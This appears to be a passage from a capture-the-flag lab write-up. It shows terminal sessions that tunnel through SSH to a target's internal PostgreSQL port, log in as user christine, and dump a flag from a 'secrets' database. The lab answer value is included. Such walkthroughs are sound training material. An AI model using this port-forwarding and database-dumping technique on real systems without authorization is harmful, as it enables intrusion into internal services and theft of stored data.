
```sh
┌──(fixit42㉿kali)-[~]
└─$ ssh -L 12345:localhost:5432 christine@10.129.1.73
```

```sh
┌──(fixit42㉿kali)-[~]
└─$ psql -h 127.0.0.1 -p 12345 -U christine
Password for user christine: 
psql (18.4 (Debian 18.4-1), server 15.1 (Debian 15.1-1.pgdg110+1))
Type "help" for help.

christine=# \list
                                                      List of databases
   Name    |   Owner   | Encoding | Locale Provider |  Collate   |   Ctype    | Locale | ICU Rules |    Access privileges    
-----------+-----------+----------+-----------------+------------+------------+--------+-----------+-------------------------
 christine | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
 postgres  | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
 secrets   | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
 template0 | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | =c/christine           +
           |           |          |                 |            |            |        |           | christine=CTc/christine
 template1 | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | =c/christine           +
           |           |          |                 |            |            |        |           | christine=CTc/christine
(5 rows)

christine=# \c secrets
psql (18.4 (Debian 18.4-1), server 15.1 (Debian 15.1-1.pgdg110+1))
You are now connected to database "secrets" as user "christine".

secrets=# \d
         List of relations
 Schema | Name | Type  |   Owner
--------+------+-------+-----------
 public | flag | table | christine
(1 row)                                                                                                                       

secrets=# select * from flag;
              value               
----------------------------------
 cf277664b1771217d7006acdea006db1
(1 row)

secrets=# 
```

cf277664b1771217d7006acdea006db1
